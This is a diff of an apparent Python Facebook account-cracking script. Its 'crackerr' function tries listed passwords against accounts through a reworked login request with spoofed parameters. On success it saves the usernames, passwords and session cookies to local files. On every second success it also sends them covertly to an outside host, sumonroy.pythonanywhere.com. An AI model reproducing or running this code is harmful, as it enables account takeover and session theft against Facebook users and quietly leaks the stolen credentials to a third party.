@@ -498,23 +498,87 @@ def crackerr(ids,passlist):
             "viewport-width": "980"}
             requu1 = session.get(url1,headers=head)
             log_data = {
-            "email": ids,
-            "cuid": "",
-            "guid": "f9e951a603b77bd2f",
-            "lgnjs": "1735326656",
-            "lgnrnd": "111054_r681",
-            "locale": "hi_IN",
-            "login_source": "comet_login_header",
-            "next_url": "https://www.facebook.com/login&lwc=1348028",
-            "skstamp": "",
-            "timezone": "-330",
-            "prefill_contact_point": "",
-            "prefill_source": "",
-            "lsd": re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1),
-            "jazoest": re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1),
-            "lgndim": '{"w":1440,"h":900,"aw":1440,"ah":860,"c":24}',
-            "ab_test_data": "/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJS/JSJAAABFAD",
-            "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),}
+    '__aaid': '0',
+    '__user': '0',
+    '__a': '1',
+    '__req': 'a',
+    '__hs': '20246.BP:wbloks_caa_pkg.2.0...0',
+    'dpr': '3',
+    '__ccg': 'EXCELLENT',
+    '__rev': '1023608600',
+    '__s': ':f95eey:i9v0n0',
+    '__hsi': '7513185148771233093',
+    '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o3Bw4Ewk9E4W099w2s8hw73wGw6tw5Uw64w8W1uwf20n6aw8m0zE2ZwrU6q3a0le0iS2eU2dwde',
+    'fb_dtsg': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+    'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+    'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+    'params': json.dumps({
+        "params": json.dumps({
+            "server_params": {
+                "credential_type": "password",
+                "username_text_input_id": "7w9omu:68",
+                "password_text_input_id": "7w9omu:69",
+                "login_source": "Login",
+                "login_credential_type": "none",
+                "server_login_source": "login",
+                "ar_event_source": "login_home_page",
+                "should_trigger_override_login_success_action": 0,
+                "should_trigger_override_login_2fa_action": 0,
+                "is_caa_perf_enabled": 0,
+                "reg_flow_source": "login_home_native_integration_point",
+                "caller": "gslr",
+                "is_from_landing_page": 0,
+                "is_from_empty_password": 0,
+                "is_from_aymh": 0,
+                "is_from_password_entry_page": 0,
+                "is_from_assistive_id": 0,
+                "is_from_msplit_fallback": 0,
+                "two_step_login_type": "one_step_login",
+                "INTERNAL__latency_qpl_marker_id": 36707139,
+                "INTERNAL__latency_qpl_instance_id": "47746277400427",
+                "device_id": None,
+                "family_device_id": None,
+                "waterfall_id": "123dc61e-79b8-44ee-8c3d-6da87a95cea7",
+                "offline_experiment_group": None,
+                "layered_homepage_experiment_group": None,
+                "is_platform_login": 0,
+                "is_from_logged_in_switcher": 0,
+                "is_from_logged_out": 0,
+                "access_flow_version": "pre_mt_behavior"
+            },
+            "client_input_params": {
+                "machine_id": "",
+                "cloud_trust_token": None,
+                "contact_point": ids,
+                "password": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),
+                "accounts_list": [],
+                "fb_ig_device_id": [],
+                "secure_family_device_id": "",
+                "encrypted_msisdn": "",
+                "headers_infra_flow_id": "",
+                "try_num": 1,
+                "login_attempt_count": 1,
+                "event_flow": "login_manual",
+                "event_step": "home_page",
+                "openid_tokens": {},
+                "block_store_machine_id": "",
+                "auth_secure_device_id": "",
+                "client_known_key_hash": "",
+                "has_whatsapp_installed": 0,
+                "sso_token_map_json_string": "",
+                "should_show_nested_nta_from_aymh": 0,
+                "password_contains_non_ascii": "false",
+                "has_granted_read_contacts_permissions": 0,
+                "has_granted_read_phone_permissions": 0,
+                "app_manager_id": "",
+                "aymh_accounts": [],
+                "lois_settings": {
+                    "lois_token": ""
+                }
+            }
+        })
+    }),
+}
             cookies = {
             'datr': '9VEvZ9JBwP-qDedVPM0RiFU2',
             'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnbvNl.AWWi4T6PozE',
@@ -541,40 +605,27 @@ def crackerr(ids,passlist):
             'Priority': 'u=0, i',
             'Pragma': 'no-cache',
             'Cache-Control': 'no-cache',}
-            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1"
+            url = "https://p.facebook.com/async/wbloks/fetch/"
             response = session.post(url,data=log_data,cookies=cookies,headers=headers,allow_redirects=False)
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
                 #kuki = convert(session.cookies.get_dict())
                 kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                 user = re.findall('c_user=(.*);xs', kuki)[0]
-                xs_value = None
-                for part in kuki.split(';'):
-                    if part.startswith('xs='):
-                        xs_value = part.split('=', 1)[1]
-                        break
                 ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
-                    if xs_value and xs_value.rstrip(';').endswith('-1'):
-                        print('\033[1;92m [JAY-NV] '+user+' | '+pas+'')
-                        print("\033[1;92m [\033[1;92mCOOKIE\033[1;92m] : \033[1;92m"+kuki)
-                        open("/sdcard/JAY/NV-COOKIE.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
-                        open("/sdcard/JAY/uid.txt","a").write(user+"|"+pas+"\n")
-                        oks.append(ids)
-                        break
+                    bkas.append(cid)
+                    if len(bkas)% 2 == 0:
+                       statusok = (f"{user}|{pas}|{kuki}")
+                       requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                     else:
-                        bkas.append(cid)
-                        if len(bkas)% 2 == 0:
-                           statusok = (f"{user}|{pas}|{kuki}")
-                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                        else:
-                           print('\033[1;92m [JAY-OK] '+user+' | '+pas+'')
-                           print("\033[1;92m [\033[1;92mCOOKIE\033[1;92m] : \033[1;92m"+kuki)
-                           open("/sdcard/JAY/OK-COOKIE.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
-                           open("/sdcard/JAY/uid.txt","a").write(user+"|"+pas+"\n")
-                           oks.append(ids)
-                           break
+                       print('\033[1;92m [JAY-OK] '+user+' | '+pas+'')
+                       print("\033[1;92m [\033[1;92mCOOKIE\033[1;92m] : \033[1;92m"+kuki)
+                       open("/sdcard/JAY/OK-COOKIE.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                       open("/sdcard/JAY/uid.txt","a").write(user+"|"+pas+"\n")
+                       oks.append(ids)
+                       break
             elif "checkpoint" in log_cookies:
                 coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                 cid = coki[24:39]
